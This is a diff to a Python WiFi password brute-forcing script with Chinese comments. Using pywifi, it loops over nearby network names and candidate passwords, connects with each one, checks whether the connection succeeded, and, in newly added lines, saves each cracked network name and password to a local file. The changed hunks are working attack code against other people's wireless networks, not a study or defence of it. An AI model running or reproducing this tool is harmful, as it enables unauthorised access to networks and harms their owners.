@@ -1,8 +1,7 @@
-import pywifi
-
-from pywifi import const  # 引用一些定义
-
 import time
+
+import pywifi
+from pywifi import const  # 引用一些定义
 namelist = []
 ssidlist = []
 result = []  # 存放查询到的WIFI,密码
@@ -42,17 +41,13 @@ def testwifi(ssidname, password):
     profile.cipher = const.CIPHER_TYPE_CCMP  ##加密单元
     profile.key = password  # wifi密码
     ifaces.remove_all_network_profiles()  # 删除其他所有配置文件
-    # const.IFACE_CONNECTED
     tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
     ifaces.connect(tmp_profile)  # 连接wifi
     time.sleep(5)
     if ifaces.status() == const.IFACE_CONNECTED:
         return True
     else:
-        # print("[-]WiFi connection failure!")
         return False
-    # ifaces.disconnect()#断开连接
-    # time.sleep(1)
     return True
 def main():
     getwifi()
@@ -74,6 +69,8 @@ def main():
                 for ssidname in ssidlist:
                     if (testwifi(ssidname, password) == True):
                         result.append((ssidname, password))  # 把找到的WIFI密码保存起来
+                        with open('wifi的账号和密码', 'w', encoding='utf8') as f:
+                            f.write(ssidname + "  " + password)
                         print('Succ', 'Current WifiName:', ssidname, 'Current Password:', password)
                     else:
                         print('Fail', 'Current WifiName:', ssidname, 'Current Password:', password)
